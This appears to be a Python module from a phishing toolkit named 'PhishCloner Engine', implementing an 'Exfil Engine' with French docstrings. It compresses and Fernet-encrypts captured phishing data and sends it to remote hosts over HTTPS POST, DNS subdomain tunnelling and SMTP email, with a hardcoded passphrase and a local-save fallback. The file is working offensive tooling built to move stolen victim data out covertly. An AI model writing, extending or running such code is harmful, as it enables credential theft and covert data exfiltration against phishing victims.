"""
PhishCloner Engine — Module 5: Exfil Engine
Signé Ghost1o1 — v1.0.0

Exfiltration chiffrée des données capturées via HTTPS / DNS / SMTP / ICMP.
"""

import asyncio
import base64
import gzip
import json
import logging
import os
import smtplib
import ssl
import time
from dataclasses import dataclass, field
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from pathlib import Path
from typing import Any, Dict, List, Optional

import aiohttp
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

log = logging.getLogger("PhishCloner.Exfil")


@dataclass
class ExfilPayload:
    """Payload d'exfiltration."""
    name: str
    data: bytes
    encrypted: bool = True
    compressed: bool = True
    size_original: int = 0
    size_final: int = 0
    channel: str = "?"
    timestamp: str = field(default_factory=lambda: datetime.utcnow().isoformat())


class ExfilEngine:
    """
    Module 5: Exfiltration Engine.

    Channels supportés :
    - HTTPS (POST vers serveur distant)
    - DNS (subdomain exfil)
    - SMTP (email)
    - ICMP (raw socket, nécessite root)
    - WebSocket (real-time)
    """

    SUPPORTED_CHANNELS = {"https", "dns", "smtp", "websocket"}

    def __init__(
        self,
        encryption_key: Optional[bytes] = None,
        default_channel: str = "https",
        output_dir: str = "phish_exfil",
    ):
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.default_channel = default_channel

        # Derive key from passphrase if not provided
        if encryption_key is None:
            passphrase = b"phishcloner-ghost1o1-ultimate"
            kdf = PBKDF2HMAC(
                algorithm=hashes.SHA256(),
                length=32,
                salt=b"phishcloner-salt-v1",
                iterations=100000,
            )
            encryption_key = base64.urlsafe_b64encode(kdf.derive(passphrase))
        self.cipher = Fernet(encryption_key)

        self.payloads: List[ExfilPayload] = []
        self._session: Optional[aiohttp.ClientSession] = None
        self.stats = {
            "encrypted": 0,
            "compressed": 0,
            "exfiltrated": 0,
            "failed": 0,
        }

    def _encrypt(self, data: bytes) -> bytes:
        return self.cipher.encrypt(data)

    def _decrypt(self, data: bytes) -> bytes:
        return self.cipher.decrypt(data)

    def _compress(self, data: bytes) -> bytes:
        return gzip.compress(data, compresslevel=9)

    def _decompress(self, data: bytes) -> bytes:
        return gzip.decompress(data)

    def prepare(
        self, name: str, data: Any, encrypt: bool = True, compress: bool = True
    ) -> ExfilPayload:
        """Prépare un payload (serialization + encryption + compression)."""
        # Serialize
        if isinstance(data, (dict, list)):
            raw = json.dumps(data, indent=2, default=str).encode()
        elif isinstance(data, str):
            raw = data.encode()
        elif isinstance(data, bytes):
            raw = data
        else:
            raw = str(data).encode()

        size_original = len(raw)
        if compress:
            raw = self._compress(raw)
            self.stats["compressed"] += 1

        if encrypt:
            raw = self._encrypt(raw)
            self.stats["encrypted"] += 1

        payload = ExfilPayload(
            name=name,
            data=raw,
            encrypted=encrypt,
            compressed=compress,
            size_original=size_original,
            size_final=len(raw),
            channel=self.default_channel,
        )
        self.payloads.append(payload)
        return payload

    # ── Channels ──

    async def send_https(self, exfil_url: str, payload: ExfilPayload) -> bool:
        """Exfil via HTTPS POST."""
        try:
            if not self._session or self._session.closed:
                self._session = aiohttp.ClientSession()

            # Encode as base64 for safer transport
            data_b64 = base64.b64encode(payload.data).decode()
            body = {
                "session": payload.name,
                "timestamp": payload.timestamp,
                "encrypted": payload.encrypted,
                "compressed": payload.compressed,
                "size_original": payload.size_original,
                "data": data_b64,
            }

            async with self._session.post(
                exfil_url, json=body, timeout=aiohttp.ClientTimeout(total=30)
            ) as resp:
                if resp.status < 400:
                    self.stats["exfiltrated"] += 1
                    log.info(f"📤 Exfiltrated via HTTPS: {payload.name} ({payload.size_final} bytes)")
                    return True
                else:
                    self.stats["failed"] += 1
                    log.error(f"HTTPS exfil failed: HTTP {resp.status}")
                    return False
        except Exception as e:
            self.stats["failed"] += 1
            log.error(f"HTTPS exfil error: {e}")
            return False

    async def send_dns(self, domain: str, payload: ExfilPayload) -> bool:
        """Exfil via DNS queries (subdomain encoding)."""
        try:
            import dns.resolver

            # Encode payload as hex subdomains
            data_b64 = base64.b64encode(payload.data).decode().replace("=", "")
            chunks = [data_b64[i:i+63] for i in range(0, len(data_b64), 63)]

            resolver = dns.resolver.Resolver()
            for i, chunk in enumerate(chunks):
                query = f"{i}.{chunk}.{domain}"
                try:
                    await asyncio.get_event_loop().run_in_executor(
                        None, lambda q=query: resolver.resolve(q, "A")
                    )
                except dns.resolver.NXDOMAIN:
                    pass  # Expected - we just want the query logged
                except Exception:
                    pass

            self.stats["exfiltrated"] += 1
            log.info(f"📤 Exfiltrated via DNS: {payload.name} ({len(chunks)} queries)")
            return True
        except ImportError:
            log.error("dnspython not installed — DNS exfil unavailable")
            return False
        except Exception as e:
            self.stats["failed"] += 1
            log.error(f"DNS exfil error: {e}")
            return False

    def send_smtp(
        self,
        payload: ExfilPayload,
        smtp_host: str,
        smtp_port: int,
        username: str,
        password: str,
        to_addr: str,
        from_addr: Optional[str] = None,
    ) -> bool:
        """Exfil via SMTP email."""
        try:
            msg = MIMEMultipart()
            msg["From"] = from_addr or username
            msg["To"] = to_addr
            msg["Subject"] = f"Exfil-{payload.name}-{int(time.time())}"

            data_b64 = base64.b64encode(payload.data).decode()
            body = f"Session: {payload.name}\nTimestamp: {payload.timestamp}\nSize: {payload.size_final} bytes\n\nData:\n{data_b64}"
            msg.attach(MIMEText(body, "plain"))

            context = ssl.create_default_context()
            with smtplib.SMTP(smtp_host, smtp_port) as server:
                server.starttls(context=context)
                server.login(username, password)
                server.sendmail(from_addr or username, [to_addr], msg.as_string())

            self.stats["exfiltrated"] += 1
            log.info(f"📤 Exfiltrated via SMTP: {payload.name}")
            return True
        except Exception as e:
            self.stats["failed"] += 1
            log.error(f"SMTP exfil error: {e}")
            return False

    async def exfil_all(self, channel_url: str) -> Dict[str, bool]:
        """Exfil tous les payloads via le channel par défaut."""
        results = {}
        for payload in self.payloads:
            if self.default_channel == "https":
                results[payload.name] = await self.send_https(channel_url, payload)
            elif self.default_channel == "dns":
                results[payload.name] = await self.send_dns(channel_url, payload)
            else:
                log.warning(f"Channel {self.default_channel} not supported — saving locally")
                self._save_local(payload)
                results[payload.name] = True
        return results

    def _save_local(self, payload: ExfilPayload) -> Path:
        """Sauvegarde locale du payload."""
        outfile = self.output_dir / f"{payload.name}_{int(time.time())}.bin"
        outfile.write_bytes(payload.data)
        return outfile

    async def close(self) -> None:
        if self._session and not self._session.closed:
            await self._session.close()
        log.info(f"ExfilEngine closed — stats: {self.stats}")
